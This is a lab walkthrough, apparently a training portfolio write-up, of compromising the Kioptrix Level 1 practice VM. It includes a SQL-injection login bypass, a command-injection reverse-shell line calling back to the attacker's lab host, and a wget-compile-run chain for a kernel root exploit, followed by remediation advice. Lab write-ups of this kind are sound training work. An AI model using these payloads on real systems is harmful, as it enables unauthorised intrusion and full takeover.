# Kioptrix Level 1 — Penetration Test Write-up

A full walkthrough of compromising the **Kioptrix Level 1** vulnerable machine (VulnHub) in an isolated home lab. This documents the end-to-end offensive security methodology: reconnaissance, enumeration, exploitation, and privilege escalation.

> **Legal & Ethical Notice:** All activity was performed against a deliberately vulnerable practice VM on a private, isolated lab network. Only private RFC-1918 addresses (192.168.x.x) are involved. Never test systems you do not own or lack explicit written permission to test.

---

## Lab Setup

| Role | Host | IP |
|------|------|----|
| Attacker | Kali Linux | 192.168.1.64 |
| Target | Kioptrix Level 1 | 192.168.1.99 |

**Tools used:** netdiscover, Nmap, searchsploit, Python HTTP server, wget, gcc, netcat.

---

## 1. Host Discovery

Used ARP-based scanning (netdiscover) to locate live hosts on the local subnet and identify the target at `192.168.1.99`.

<!-- IMAGE PLACEHOLDER 1 -> drop screenshot here: netdiscover/ARP scan showing hosts 192.168.1.98 and 192.168.1.99 -->
![Host discovery with netdiscover](images/01-host-discovery.png)

---

## 2. Service & OS Enumeration

Ran an Nmap service-version and OS-detection scan against the target:

```bash
nmap -sV -O 192.168.1.99
```

Key findings:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 3.9p1 (protocol 1.99) |
| 80/tcp | http | Apache httpd 2.0.52 (CentOS) |
| 111/tcp | rpcbind | RPC #100000 |
| 443/tcp | ssl/http | Apache httpd 2.0.52 (CentOS) |
| 631/tcp | ipp | CUPS 1.1 |
| 3306/tcp | mysql | MySQL |

**OS detection:** Linux kernel 2.6.9 – 2.6.30 (CentOS). These outdated services immediately stand out as likely vulnerable.

<!-- IMAGE PLACEHOLDER 2 -> drop screenshot here: nmap -sV -O output showing open ports and OS -->
![Nmap service and OS scan](images/02-nmap-scan.png)

---

## 3. Initial Access — Web Application Exploitation

The web server exposed a **Remote System Administration Login** page. The login form was vulnerable to **SQL injection**, which I bypassed using a classic authentication-bypass payload:

```sql
admin' or 1=1 #
```

<!-- IMAGE PLACEHOLDER 3 -> drop screenshot here: login form with SQLi payload admin' or 1=1 # -->
![SQL injection login bypass](images/03-sql-injection.png)

This granted access to a **Basic Administrative Web Console**. Its "Ping a Machine on the Network" feature was vulnerable to **command injection**, which I abused to spawn a reverse shell back to my attacker machine:

```bash
| sh -i >& /dev/tcp/192.168.1.64/4444 0>&1
```

<!-- IMAGE PLACEHOLDER 4 -> drop screenshot here: admin web console with command-injection reverse shell payload -->
![Command injection reverse shell](images/04-command-injection.png)

A netcat listener on the attacker machine (`nc -lvnp 4444`) caught the connection, providing a low-privilege shell on the target.

---

## 4. Privilege Escalation — Linux Kernel Exploit (CVE-2009-2692)

With a limited shell, the outdated Linux 2.6 kernel identified during enumeration pointed to the well-known `sock_sendpage()` local privilege escalation vulnerability.

I located the matching exploit with searchsploit:

```bash
searchsploit -m linux/local/9545.c   # CVE-2009-2692 / EDB-9545
```

<!-- IMAGE PLACEHOLDER 5 -> drop screenshot here: searchsploit output showing CVE-2009-2692 / EDB-9545 -->
![searchsploit locating the kernel exploit](images/05-searchsploit.png)

I served the exploit from the attacker box over HTTP and transferred, compiled, and executed it on the target:

```bash
# On attacker (Kali)
python3 -m http.server 8000

# On target (via reverse shell)
cd /tmp
wget 192.168.1.64:8000/9545.c
gcc -o exploit 9545.c
chmod +x exploit
./exploit
whoami   # => root
```

<!-- IMAGE PLACEHOLDER 6 -> drop screenshot here: wget + gcc + ./exploit + whoami showing root -->
![Privilege escalation to root](images/06-privesc-root.png)

The exploit succeeded, escalating from a limited web shell to **root** — full compromise of the host.

---

## 5. Result

Starting from an unauthenticated network position, the target was fully compromised:

reconnaissance -> service enumeration -> web app exploitation (SQLi + command injection) -> reverse shell -> kernel privilege escalation -> **root**.

---

## Remediation Recommendations

- **Patch aggressively:** upgrade the Linux kernel and Apache to remove known CVEs (e.g., CVE-2009-2692).
- **Fix SQL injection:** use parameterized queries / prepared statements; never build SQL from raw user input.
- **Fix command injection:** validate and sanitize all input; avoid passing user input to shell commands, and use safe APIs instead of shelling out.
- **Least privilege & segmentation:** restrict and network-segment administrative interfaces, and run services as non-root where possible.
- **Disable unused services:** close ports/services (e.g., legacy RPC, CUPS) that aren't required.

---

## What I Learned

Working through the full attack chain deepened my understanding of attacker tactics, techniques, and procedures (TTPs). This directly strengthens my SOC / blue-team work — understanding how an intrusion actually unfolds makes alert triage, log analysis, and threat detection far sharper.

---

*Written by Prashant Sapkota. Performed in a legal, isolated home lab for educational purposes.*
